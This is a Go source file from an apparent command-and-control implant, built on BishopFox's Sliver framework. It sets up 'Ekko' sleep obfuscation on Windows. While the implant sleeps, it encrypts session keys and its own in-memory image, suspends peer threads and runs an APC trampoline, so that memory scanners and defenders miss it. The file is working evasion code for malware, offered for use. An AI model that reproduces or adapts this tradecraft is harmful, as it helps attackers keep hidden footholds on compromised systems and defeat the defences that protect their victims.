package evasion

/*
	Windows Sleep Obfuscation — Ekko via APC trampoline

	On Windows, sleep obfuscation uses the apc.Sleep implementation
	(implant/sliver/apc/apc.go) adapted from BishopFox/sliver PR #1805:

	1. Suspends all image-based peer threads (with per-peer watchdog
	   timers to guard against Go runtime P-handoff deadlocks)
	2. Queues an x64 trampoline via QueueUserAPC that lives OUTSIDE
	   the image (survives encryption)
	3. Enters alertable wait; trampoline executes:
	   VirtualProtect(RW) → SystemFunction032 encrypt → NtDelayExecution →
	   SystemFunction032 decrypt → VirtualProtect(.text RX) → ret
	4. Resumes all suspended peers

	Combined with ChaCha20 data-region encryption for session keys
	and sensitive buffers (from sleep_obfuscate.go).
*/

import (
	"time"

	"github.com/bishopfox/sliver/implant/sliver/apc"
)

func init() {
	SleepWithCallstackSpoof = ekkoSleep
}

func ekkoSleep(duration time.Duration) {
	// Encrypt sensitive data regions (session keys, etc.)
	encryptRegions()
	defer decryptRegions()

	ms := uint64(duration.Milliseconds())
	if ms == 0 {
		return
	}

	// Use the full Ekko implementation: suspend peers, encrypt PE image,
	// sleep via NtDelayExecution, decrypt, resume peers
	err := apc.Sleep(ms)
	if err != nil {
		// Fallback to plain sleep if Ekko fails (non-Windows arch at
		// runtime, or thread suspension issue)
		time.Sleep(duration)
	}
}
